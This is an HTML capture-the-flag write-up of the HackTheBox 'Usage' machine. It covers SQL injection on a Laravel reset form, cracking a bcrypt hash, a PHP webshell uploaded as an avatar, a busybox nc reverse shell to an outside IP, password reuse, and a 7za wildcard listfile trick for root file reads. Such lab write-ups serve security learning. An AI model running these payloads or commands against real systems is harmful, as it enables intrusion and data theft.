@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/usage.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Usage - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Usage</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Usage</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">laravel sqli</span>
+                    <span class="tag">bcrypt crack</span>
+                    <span class="tag">avatar upload webshell</span>
+                    <span class="tag">monitrc credential reuse</span>
+                    <span class="tag">7za wildcard listfile</span>
+                </div>
+
+                <img src="../../images/hackthebox/usage/index.png" alt="Usage Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Two ports, SSH and an nginx that immediately redirects to <code>usage.htb</code>. Added the vhost to <code>/etc/hosts</code>.</p>
+
+                <pre><code>[Usage] nmap -Pn -sSVC -p- -T5 --min-rate 2000 -oN nmap -v 10.129.28.237
+Nmap scan report for 10.129.28.237
+Host is up (0.23s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://usage.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The main site is a Laravel blog with the usual authentication routes: <code>/login</code>, <code>/registration</code>, <code>/forget-password</code>, <code>/dashboard</code>. There is a second vhost too, <code>admin.usage.htb</code>, which serves a Laravel-admin panel (<code>/admin</code>, <code>/vendor</code>, <code>/uploads</code>). Both went into <code>/etc/hosts</code>.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>The password reset form on <code>usage.htb</code> is the way in. Posting a single quote in the <code>email</code> field throws an error, and a comment sequence like <code>'; -- -</code> produces a clean 302 redirect instead. That difference between a broken query and a valid-but-commented one is the tell for SQL injection.</p>
+
+                <p>I saved the request and handed it to <code>sqlmap</code>, targeting the <code>email</code> parameter:</p>
+
+                <pre><code>[Usage] sqlmap -r req --risk 3 --level 5 -t 10 -o -p email
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Type: time-based blind
+    Title: MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK)
+back-end DBMS: MySQL &lt; 5.0.12
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] usage_blog</code></pre>
+
+                <p>The <code>usage_blog</code> database has an <code>admin_users</code> table, and dumping it returns the panel's admin account with a bcrypt hash:</p>
+
+                <pre><code>Database: usage_blog
+Table: admin_users
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
++----------+--------------------------------------------------------------+</code></pre>
+
+                <p>That hash falls quickly to <code>rockyou</code>:</p>
+
+                <pre><code>[Usage] hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
+$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1</code></pre>
+
+                <p>Logging in to <code>http://admin.usage.htb/admin</code> as <code>admin</code> / <code>whatever1</code> lands in the Laravel-admin dashboard. The account settings page at <code>/admin/auth/setting</code> has an avatar upload, and it does not validate the file type. Swapping the image for a PHP file gets accepted:</p>
+
+                <pre><code>Content-Disposition: form-data; name="avatar"; filename="test.php"
+Content-Type: application/x-httpd-php
+
+&lt;?php system($_GET['0']); ?&gt;</code></pre>
+
+                <p>Uploaded avatars are served from <code>/uploads/images/</code>, so the shell is reachable and takes commands straight through the <code>0</code> parameter. I used it to call back with a <code>busybox</code> reverse shell:</p>
+
+                <pre><code>[Usage] nc -lvnp 4455
+
+http://admin.usage.htb/uploads/images/test.php?0=busybox%20nc%2010.10.15.221%204455%20-e%20/bin/bash</code></pre>
+
+                <pre><code>[Usage] nc -lvnp 4455
+Connection received
+dash@usage:~$ id
+uid=1000(dash) gid=1000(dash) groups=1000(dash)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>Foothold as <code>dash</code>. There is another user, <code>xander</code>, on the box. In <code>dash</code>'s home directory the monit config file leaks a password in cleartext:</p>
+
+                <pre><code>dash@usage:~$ cat /home/dash/.monitrc
+...
+set httpd port 2812 and
+    use address localhost
+    allow admin:"3nc0d3d_pa$$w0rd"</code></pre>
+
+                <p>The password <code>3nc0d3d_pa$$w0rd</code> is reused for the <code>xander</code> account, so it is a direct switch:</p>
+
+                <pre><code>dash@usage:~$ su xander
+Password: 3nc0d3d_pa$$w0rd
+xander@usage:~$ id
+uid=1001(xander) gid=1001(xander) groups=1001(xander)</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p><code>xander</code> can run a single custom binary as root without a password:</p>
+
+                <pre><code>xander@usage:~$ sudo -l
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management</code></pre>
+
+                <p>Running the strings on <code>usage_management</code> shows what it actually does. Option 1 changes into the web root and archives everything with 7-Zip:</p>
+
+                <pre><code>xander@usage:~$ strings /usr/bin/usage_management
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+/usr/bin/mysqldump -A &gt; /var/backups/mysql_backup.sql
+1. Project Backup
+2. Backup MySQL data</code></pre>
+
+                <p>The vulnerable piece is <code>-- *</code>. The shell expands <code>*</code> to every filename in <code>/var/www/html</code> before <code>7za</code> ever sees it, and <code>7za</code> treats any argument that begins with <code>@</code> as a <em>listfile</em>, a file whose lines name additional paths to add to the archive. So if I create a file named <code>@x</code> in that directory, <code>7za</code> reads a file called <code>x</code> to decide what to include. Putting a root-only path inside <code>x</code> makes <code>7za</code>, running as root, archive that file for me.</p>
+
+                <p>Using a distinct name like <code>x</code> avoids the duplicate-entry error you hit if the listfile and its target both resolve to the same archive name:</p>
+
+                <pre><code>xander@usage:/var/www/html$ echo "/root/root.txt" &gt; x
+xander@usage:/var/www/html$ touch @x
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+1. Project Backup
+2. Backup MySQL data
+Enter your choice: 1</code></pre>
+
+                <p>7-Zip follows the listfile, pulls <code>/root/root.txt</code> into <code>project.zip</code> as root, and the archive is readable back as <code>xander</code>. Extracting that one entry prints the root flag:</p>
+
+                <pre><code>xander@usage:/var/www/html$ unzip -p /var/backups/project.zip root.txt</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Usage</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
